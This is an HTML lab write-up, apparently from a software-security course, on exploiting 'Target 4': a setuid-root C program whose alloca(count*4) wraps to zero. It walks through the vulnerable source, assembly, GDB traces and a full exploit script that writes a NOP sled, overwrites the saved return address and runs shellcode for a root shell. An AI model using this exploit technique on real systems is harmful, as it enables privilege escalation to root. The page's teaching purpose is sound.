@@ -1,0 +1,316 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Target 4 — Alloca Integer Overflow</title>
+<style>
+  :root {
+    --ink:#17202b; --muted:#5b6879; --bg:#f3f6fa; --card:#fff; --line:#d9e1eb;
+    --red:#b42318; --red-bg:#fef3f2; --green:#13713d; --green-bg:#ecfdf3;
+    --blue:#1d5fa7; --blue-bg:#eff6ff; --amber:#8a5a00; --amber-bg:#fffaeb;
+    --purple:#6941c6; --purple-bg:#f4f0ff;
+    --code-bg:#101823; --code-ink:#dce7f4; --code-muted:#8b9db2;
+    --mono:"Cascadia Code",Consolas,"SFMono-Regular","Liberation Mono",monospace;
+  }
+  * { box-sizing:border-box; }
+  html { scroll-behavior:smooth; }
+  body {
+    margin:0; color:var(--ink);
+    background:
+      radial-gradient(circle at 10% 0%, #e2ecff 0, transparent 32rem),
+      radial-gradient(circle at 92% 16%, #e7f8ef 0, transparent 28rem),
+      var(--bg);
+    font-family:"Segoe UI",system-ui,-apple-system,sans-serif; line-height:1.62;
+  }
+  a { color:var(--blue); }
+  code, pre { font-family:var(--mono); }
+  .wrap { width:min(1180px,calc(100% - 32px)); margin:0 auto; }
+
+  header.hero {
+    color:#f8fbff;
+    background:
+      radial-gradient(circle at 82% 12%, rgba(80,151,255,.28) 0, transparent 25rem),
+      radial-gradient(circle at 14% 84%, rgba(72,211,146,.14) 0, transparent 20rem),
+      linear-gradient(135deg,#101823 0%,#182a3e 54%,#14332b 100%);
+    border-bottom:1px solid #0a1017; padding:62px 0 46px;
+  }
+  .eyebrow { color:#7de0a8; text-transform:uppercase; letter-spacing:.17em; font-size:.74rem; font-weight:800; margin-bottom:14px; }
+  h1 { max-width:1000px; margin:0; font-size:clamp(2.1rem,5vw,4rem); line-height:1.04; letter-spacing:-.035em; }
+  .lede { max-width:900px; color:#bdcad9; font-size:1.08rem; margin:22px 0 26px; }
+  .badges { display:flex; flex-wrap:wrap; gap:9px; }
+  .badge { display:inline-flex; gap:7px; align-items:center; padding:7px 11px; border:1px solid rgba(255,255,255,.16); border-radius:999px; background:rgba(255,255,255,.06); color:#e8eff8; font-size:.75rem; font-weight:700; letter-spacing:.03em; }
+  .badge .dot { width:7px; height:7px; border-radius:50%; background:#7de0a8; }
+  .badge.blue .dot { background:#84bdff; }
+  .badge.amber .dot { background:#ffc266; }
+
+  main { padding:38px 0 80px; }
+  section { margin:54px 0; scroll-margin-top:18px; }
+  h2 { font-size:clamp(1.5rem,3vw,2.1rem); line-height:1.16; letter-spacing:-.025em; margin:0 0 8px; }
+  h2 .num { display:inline-grid; place-items:center; vertical-align:4px; width:34px; height:34px; margin-right:8px; border-radius:10px; background:#18283b; color:#fff; font-size:.94rem; letter-spacing:0; }
+  h3 { font-size:1.12rem; margin:26px 0 8px; }
+  p { margin:10px 0; }
+  .section-intro { color:var(--muted); max-width:930px; margin-bottom:20px; }
+
+  .toc { background:var(--card); border:1px solid var(--line); border-radius:16px; padding:18px 22px; margin-bottom:38px; box-shadow:0 8px 24px rgba(22,34,51,.05); }
+  .toc strong { display:block; font-size:.76rem; letter-spacing:.12em; text-transform:uppercase; color:var(--muted); margin-bottom:9px; }
+  .toc ol { margin:0; padding-left:20px; columns:2; column-gap:36px; }
+  .toc li { margin:5px 0; break-inside:avoid; }
+
+  .card { background:var(--card); border:1px solid var(--line); border-radius:16px; padding:22px; box-shadow:0 8px 24px rgba(22,34,51,.045); }
+  .grid { display:grid; gap:16px; }
+  .grid.two { grid-template-columns:repeat(2,minmax(0,1fr)); }
+  .grid.three { grid-template-columns:repeat(3,minmax(0,1fr)); }
+  .stat { padding:18px 20px; }
+  .stat .label { color:var(--muted); font-size:.71rem; text-transform:uppercase; letter-spacing:.11em; font-weight:800; }
+  .stat .value { font-family:var(--mono); font-size:1.08rem; font-weight:800; margin-top:6px; word-break:break-word; }
+  .stat .hint { color:var(--muted); font-size:.84rem; margin-top:3px; }
+
+  .callout { border-radius:14px; padding:16px 18px; margin:18px 0; border:1px solid; }
+  .callout strong:first-child { display:block; margin-bottom:3px; }
+  .callout.danger { background:var(--red-bg); border-color:#f5c7c2; color:#68130d; }
+  .callout.success { background:var(--green-bg); border-color:#b7ebc9; color:#0b5130; }
+  .callout.info { background:var(--blue-bg); border-color:#c7ddf8; color:#123f72; }
+  .callout.warn { background:var(--amber-bg); border-color:#f2d28a; color:#664000; }
+  .callout.purple { background:var(--purple-bg); border-color:#d9ccff; color:#3f2a83; }
+
+  .file-label { display:inline-block; margin:18px 0 -8px; padding:5px 10px; border-radius:8px 8px 0 0; background:#1b2a3d; color:#bdd0e5; font-family:var(--mono); font-size:.72rem; border:1px solid #2b3d53; border-bottom:0; }
+  .file-label + pre { margin-top:0; border-top-left-radius:0; }
+  pre { margin:16px 0; padding:18px 20px; border-radius:14px; background:var(--code-bg); color:var(--code-ink); font-size:.81rem; line-height:1.55; overflow-x:auto; border:1px solid #263649; box-shadow:inset 0 1px 0 rgba(255,255,255,.04); }
+  pre .c { color:var(--code-muted); }
+  pre .g { color:#7be0a3; }
+  pre .r { color:#ff8d84; }
+  pre .y { color:#ffd166; }
+  pre .b { color:#8ec5ff; }
+  pre .p { color:#c7a7ff; }
+
+  .table-wrap { overflow-x:auto; margin:16px 0; border:1px solid var(--line); border-radius:14px; background:#fff; }
+  table { width:100%; border-collapse:collapse; font-size:.86rem; }
+  th,td { text-align:left; padding:10px 13px; border-bottom:1px solid #e9eef5; vertical-align:top; }
+  th { background:#f7f9fc; color:#455367; font-size:.71rem; text-transform:uppercase; letter-spacing:.08em; }
+  tr:last-child td { border-bottom:0; }
+  td.mono, th.mono { font-family:var(--mono); }
+  .pill { display:inline-block; padding:2px 8px; border-radius:999px; font-size:.72rem; font-weight:800; white-space:nowrap; background:#e8edf5; color:#344257; }
+  .pill.red { background:var(--red-bg); color:var(--red); }
+  .pill.green { background:var(--green-bg); color:var(--green); }
+  .pill.blue { background:var(--blue-bg); color:var(--blue); }
+  .pill.amber { background:var(--amber-bg); color:var(--amber); }
+
+  .target-head { display:flex; justify-content:space-between; align-items:end; gap:18px; flex-wrap:wrap; margin-bottom:8px; }
+  .target-head .tag { color:var(--muted); font-family:var(--mono); font-size:.8rem; }
+  .target-banner { border-radius:14px; padding:14px 18px; margin:18px 0; background:#18283b; color:#dce7f4; border:1px solid #0f1925; }
+  .target-banner strong { color:#7de0a3; }
+  .target-banner code { color:#ffd166; }
+
+  ul,ol { padding-left:24px; }
+  li { margin:5px 0; }
+  .small { font-size:.83rem; color:var(--muted); }
+  footer { border-top:1px solid var(--line); padding:26px 0 0; color:var(--muted); font-size:.84rem; }
+
+  @media (max-width:900px) {
+    .grid.two,.grid.three { grid-template-columns:1fr; }
+    .toc ol { columns:1; }
+  }
+</style>
+<style>
+  body { overflow:auto; }
+  .backbar { padding-top:20px; }
+  .backbar a { font-size:.85rem; font-weight:700; }
+</style>
+<link rel="stylesheet" href="stack-anim.css">
+</head>
+<body>
+<div class="wrap backbar">
+  <a href="index.html#target4" target="_top">← Back to all targets</a>
+</div>
+<main class="wrap" style="padding-top:10px;padding-bottom:60px">
+<section id="stack-animation" style="margin-top:24px">
+  <div class="stack-anim" data-target="t4"></div>
+</section>
+
+<section id="target4">
+    <div class="target-head">
+      <h2><span class="num">4</span>Target 4 — alloca integer overflow</h2>
+      <span class="tag">file input · alloca · read_elements · setuid root</span>
+    </div>
+    <p class="section-intro">
+      Target 4 does not read a command-line string. It reads a binary file: the first
+      4 bytes are a count, followed by 32-bit integers. The count is used for an
+      <code>alloca(count * 4)</code>, but <code>0x40000000 * 4</code> wraps to zero in
+      32-bit arithmetic. The allocation becomes zero bytes, while <code>read_elements</code>
+      still believes the count is huge and keeps reading words into the stack.
+    </p>
+
+    <div class="grid two">
+      <div class="card">
+        <h3 style="margin-top:0">target4.c</h3>
+        <pre style="margin-bottom:0">void read_elements(FILE *f, int *buf, unsigned int count)
+{
+    unsigned int i;
+    for (i=0; i &lt; count; i++) {
+        if (fread(&amp;buf[i], sizeof(unsigned int), 1, f) &lt; 1)
+            break;
+    }
+}
+
+void read_file(char *name)
+{
+    FILE *f = fopen(name, "rb");
+    unsigned int count;
+    fread(&amp;count, sizeof(unsigned int), 1, f);
+
+    unsigned int *buf = alloca(count * sizeof(unsigned int));
+
+    read_elements(f, buf, count);   <span class="c">// still uses the huge count</span>
+}</pre>
+      </div>
+      <div class="card">
+        <h3 style="margin-top:0">Key assembly — the size wraps to zero</h3>
+        <pre style="margin-bottom:0">804a149: mov eax,[ebp-0x14]   <span class="c">; count</span>
+<span class="y">804a14c: shl eax,2</span>           <span class="c">; count * 4 (32-bit)</span>
+804a14f: lea edx,[eax+0xc]
+...
+804a166: div ecx
+804a168: imul eax,eax,0x10
+<span class="g">804a16b: sub esp,eax</span>          <span class="c">; alloca(size)</span>
+804a16d: mov eax,esp
+...
+804a181: push count
+804a188: push buf
+804a18b: push f
+804a18e: call read_elements</pre>
+        <p class="small" style="margin-bottom:0">
+          With <code>count = 0x40000000</code>, <code>shl eax,2</code> produces
+          <code>0x00000000</code>. The stack is not moved, so <code>buf</code> points at
+          the current stack position. The later loop still uses the original huge count.
+        </p>
+      </div>
+    </div>
+
+    <div class="callout warn">
+      <strong>The file format</strong>
+      First 4 bytes: <code>count = 0x40000000</code> (little-endian
+      <code>00 00 00 40</code>). Then the file contains 160 4-byte words. The first 11
+      words are NOPs, word 11 is the return address, and the remaining words are a NOP sled
+      followed by shellcode. The file is generated by <code>sol4.py</code>, not passed as
+      an argument.
+    </div>
+
+    <h3>GDB evidence — zero-size buffer and the overwritten return address</h3>
+    <div class="file-label">gdb_target4.txt</div>
+    <pre><span class="b">[1] target4: read_file() before read_elements()</span>
+read_file EBP = 0xfff6ba48
+<span class="y">count = [EBP-0x14] = 0x40000000</span>
+<span class="y">buf   = [EBP-0x10] = 0xfff6ba20</span>
+saved EIP slot = EBP+4 = 0xfff6ba4c (original 0x0804a1eb)
+<span class="g">GDB: count * 4 overflows to 0x00000000, so alloca is effectively 0</span>
+
+<span class="b">[2] target4: AFTER read_elements() returns</span>
+buf = 0xfff6ba20   count = 0x90909090
+buffer words (index 0..15):
+0xfff6ba20: 0x90909090 0x90909090 0x90909090 0x90909090
+0xfff6ba30: 0x90909090 0x90909090 0x90909090 0x90909090
+0xfff6ba40: 0x90909090 0x90909090 0x90909090 <span class="g">0xfff6bb5c</span>
+0xfff6ba50: 0x90909090 0x90909090 0x90909090 0x90909090
+<span class="g">word 11 (offset 44) at 0xfff6ba4c = 0xfff6bb5c</span>
+<span class="r">read_file saved EIP slot 0xfff6ba4c contains 0xfff6bb5c</span>
+
+<span class="b">[3] target4: read_file() ret</span>
+ESP = 0xfff6ba4c
+<span class="g">ret will pop = 0xfff6bb5c</span>
+0xfff6ba4c: 0xfff6bb5c 0x90909090 0x90909090 0x90909090
+bytes at target address:
+0xfff6bb5c: 90 90 90 90 90 90 90 90
+instruction at target:
+   0xfff6bb5c: nop
+process ... is executing new program: /usr/bin/dash</pre>
+
+    <div class="callout info">
+      <strong>Why index 11?</strong>
+      The buffer pointer is <code>0xfff6ba20</code>. The saved EIP slot is
+      <code>0xfff6ba4c</code>. Their difference is <code>0x2c = 44</code> bytes, which is
+      exactly <code>11 * 4</code>. So the 12th 32-bit word, index 11, lands on the saved
+      return address. Words 0–10 are NOP filler, word 11 is the new return address, and
+      words 12 onward contain the NOP sled and shellcode.
+    </div>
+
+    <div class="callout warn">
+      <strong>Why the count variable in GDB shows 0x90909090 later</strong>
+      The local <code>count</code> lives at <code>EBP-0x14 = 0xfff6ba34</code>, which is
+      inside the overflowed region (buffer index 5). The payload overwrites it with NOPs.
+      But <code>read_elements</code> received its own <code>count</code> argument before
+      the overwrite, so its loop still uses <code>0x40000000</code> and keeps reading until
+      <code>fread</code> hits EOF. The overwritten copy in <code>read_file</code> is no
+      longer used after the call.
+    </div>
+
+    <h3>sol4.py, line by line</h3>
+    <div class="file-label">sol4.py</div>
+    <pre>import sys
+from shellcode import shellcode
+
+return_address = 11           <span class="c"># word index that lands on saved EIP</span>
+buff = 0xfff6ba20             <span class="c"># buffer start from GDB</span>
+
+overflow = 0x40000000         <span class="c"># count * 4 wraps to 0</span>
+
+sc = bytes(shellcode)
+while len(sc) % 4:
+    sc += b"\x90"
+sc_ints = [int.from_bytes(sc[i:i+4], "little")
+           for i in range(0, len(sc), 4)]
+
+total  = 160
+sled_n = total - (return_address + 1) - len(sc_ints)
+
+payload  = [0x90909090] * return_address
+payload += [0]
+payload += [0x90909090] * sled_n
+payload += sc_ints
+
+payload[return_address] = buff + 4 * (return_address + 1 + sled_n // 2)
+
+sys.stdout.buffer.write(overflow.to_bytes(4, "little"))
+for v in payload:
+    sys.stdout.buffer.write(v.to_bytes(4, "little"))</pre>
+
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Line</th><th>What it does / why</th></tr></thead>
+        <tbody>
+          <tr><td class="mono">return_address = 11</td><td>Index 11 of the word array is <code>0xfff6ba4c</code>, the saved EIP slot.</td></tr>
+          <tr><td class="mono">buff = 0xfff6ba20</td><td>GDB shows this is the zero-size buffer start.</td></tr>
+          <tr><td class="mono">overflow = 0x40000000</td><td>Written as the file's 4-byte count. Multiplying by 4 wraps to zero in 32-bit arithmetic.</td></tr>
+          <tr><td class="mono">while len(sc) % 4: sc += NOP</td><td>Pads shellcode to whole 4-byte words so it can be written as integers.</td></tr>
+          <tr><td class="mono">sc_ints = ...</td><td>Converts the shellcode into little-endian 32-bit words.</td></tr>
+          <tr><td class="mono">total = 160</td><td>Number of words written to the file. The loop stops at EOF, not at the huge count.</td></tr>
+          <tr><td class="mono">sled_n = ...</td><td>Space left for the NOP sled after the return-address word and the shellcode words.</td></tr>
+          <tr><td class="mono">payload = [NOP] * 11</td><td>Words 0–10 fill the stack below the return address with NOPs.</td></tr>
+          <tr><td class="mono">payload += [0]</td><td>Placeholder for word 11; replaced with the sled address below.</td></tr>
+          <tr><td class="mono">payload += [NOP] * sled_n</td><td>NOP sled after the overwritten return address.</td></tr>
+          <tr><td class="mono">payload += sc_ints</td><td>Shellcode placed after the sled.</td></tr>
+          <tr><td class="mono">payload[11] = ...</td><td>Sets the saved EIP to the middle of the NOP sled: <code>0xfff6bb5c</code>.</td></tr>
+          <tr><td class="mono">write(overflow)</td><td>First 4 bytes of the file: <code>00 00 00 40</code>.</td></tr>
+          <tr><td class="mono">for v in payload: write(v)</td><td>Appends 160 little-endian words: the stack overflow data.</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="callout success">
+      <strong>Run it</strong>
+      <code>python3 sol4.py &gt; data4</code><br>
+      <code>./target4 data4</code><br>
+      Then type <code>id</code> inside the shell. Target4 is setuid-root, and the shellcode
+      calls <code>setuid(0)</code> before <code>execve("/bin/sh")</code>.
+    </div>
+
+    <p class="small">
+      Raw evidence: <a href="gdb_target4.txt">gdb_target4.txt</a> ·
+      disassembly: <a href="target4_disasm.txt">target4_disasm.txt</a> ·
+      source: <a href="target4.c">target4.c</a> · solution: <a href="sol4.py">sol4.py</a>
+    </p>
+  </section>
+</main>
+<script src="stack-anim.js"></script>
+</body>
+</html>
